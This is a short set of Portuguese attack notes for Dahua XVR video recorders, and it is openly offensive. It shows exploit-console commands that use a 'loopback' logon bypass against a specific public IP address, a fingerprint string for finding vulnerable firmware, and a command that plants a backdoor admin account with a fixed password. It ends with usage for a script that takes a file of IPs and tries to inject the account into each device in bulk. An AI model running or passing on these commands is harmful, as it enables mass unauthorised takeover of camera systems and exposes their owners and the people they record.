e roda, pra ver se conecta no console

/Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204

Dahua product:"Dahua XVR" version:"3.218.0000001.4"

python3 Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204

usermgr add pdr Senha@2026 admin

python3 Console.py --proto dhip --rport 8080 --logon loopback --rhost 127.0.0.1

.
.
.
.
.


Modo Massa: python3 dh.py -f ips.txt -p 80 -u admin -P Senha@2026
Modo Manual: python3 dh.py -i 192.168.0.15 -p 37777
Modo Interativo: python3 dh.py
Pega uma lista de ips do arquivo, e tenta injetar: python3 dh.py -f ips.txt -p 80 -u usr ou pdr -P Senha@2026
